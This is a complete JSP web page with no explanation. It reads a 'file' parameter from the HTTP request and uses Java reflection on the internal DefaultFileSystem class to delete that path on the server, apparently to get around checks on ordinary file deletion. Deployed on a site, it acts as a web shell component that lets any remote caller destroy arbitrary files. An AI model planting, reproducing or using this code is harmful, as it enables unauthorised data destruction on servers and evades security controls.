<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.File" %>
<%@ page import="java.lang.reflect.Method" %>

<%
    String file = request.getParameter("file");

    Method m = Class.forName("java.io.DefaultFileSystem").getMethod("getFileSystem");
    m.setAccessible(true);
    Object fs = m.invoke(null);

    Method m2 = fs.getClass().getMethod("delete", File.class);
    m2.setAccessible(true);
    out.print(m2.invoke(fs, new File(file)));
%>